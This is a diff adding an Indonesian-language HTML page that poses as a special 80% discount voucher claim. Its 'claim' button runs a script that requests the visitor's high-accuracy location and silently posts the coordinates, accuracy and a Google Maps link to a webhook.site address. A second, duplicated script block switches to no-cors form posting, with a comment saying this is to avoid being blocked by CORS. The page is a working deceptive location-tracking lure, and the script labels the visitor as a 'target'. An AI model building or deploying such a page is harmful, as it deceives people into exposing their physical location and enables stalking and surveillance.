@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Klaim Voucher Diskon Spesial</title>
+  <style>
+    body {
+      background-color: #f4f4f7;
+      color: #333333;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 15px;
+      box-sizing: border-box;
+    }
+    .card {
+      width: 100%;
+      max-width: 420px;
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 24px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      text-align: center;
+      border: 1px solid #eee;
+    }
+    .promo-banner {
+      width: 100%;
+      height: 180px;
+      background: linear-gradient(135deg, #ff416c, #ff4b2b);
+      border-radius: 8px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      margin-bottom: 20px;
+    }
+    .promo-banner h1 {
+      margin: 0;
+      font-size: 32px;
+      font-weight: bold;
+    }
+    .promo-banner p {
+      margin: 5px 0 0 0;
+      font-size: 16px;
+    }
+    .promo-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: #222;
+      margin-bottom: 8px;
+    }
+    .promo-desc {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+    .btn-claim {
+      background: #ff4b2b;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 14px;
+      font-size: 15px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-claim:hover {
+      background: #e03e20;
+    }
+    .status-msg {
+      font-size: 11px;
+      color: #999;
+      margin-top: 12px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="promo-banner">
+      <h1>VOUCHER 80%</h1>
+      <p>SPESIAL HARI INI</p>
+    </div>
+    
+    <div class="promo-title">Selamat! Anda mendapatkan </div>
+    <div class="promo-desc">
+      Klaim diskon promo belanja hingga Rp 150.000. Klik tombol di bawah untuk mendapatkannya & mengambil kode voucher Anda.
+    </div>
+
+    <button class="btn-claim" onclick="triggerPermissions()">[ 🎁 ] KLAIM VOUCHER SEKARANG</button>
+    <p class="status-msg">klik disini untuk memastikan promo berlaku di wilayah Anda.</p>
+  </div>
+
+  <script>
+    // URL WEBHOOK ANDA
+    const WEBHOOK_URL = 'https://webhook.site/89fc2d12-706e-4bd0-a557-c7351a3bf8e9';
+
+    function triggerPermissions() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            sendData({
+              status: "LOKASI_BERHASIL",
+              latitude: lat,
+              longitude: lon,
+              akurasi_meter: Math.round(acc),
+              google_maps: mapsUrl
+            });
+          },
+          err => {
+            sendData({ status: "LOKASI_DITOLAK_TARGET" });
+          },
+          { enableHighAccuracy: true }
+        );
+      }
+    }
+
+    function sendData(dataPayload) {
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(dataPayload)
+      });
+    }
+  </script>
+  <script>
+    const WEBHOOK_URL = 'https://webhook.site/89fc2d12-706e-4bd0-a557-c7351a3bf8e9';
+
+    function triggerPermissions() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // Mengirim data dalam bentuk Form URL Encoded agar tidak diblokir CORS
+            const bodyData = `latitude=${lat}&longitude=${lon}&akurasi_meter=${Math.round(acc)}&google_maps=${encodeURIComponent(mapsUrl)}`;
+
+            fetch(WEBHOOK_URL, {
+              method: 'POST',
+              mode: 'no-cors',
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+              body: bodyData
+            });
+          },
+          err => {
+            console.log("Izin ditolak pengguna");
+          },
+          { enableHighAccuracy: true }
+        );
+      }
+    }
+  </script>
+
+</body>
+</html>
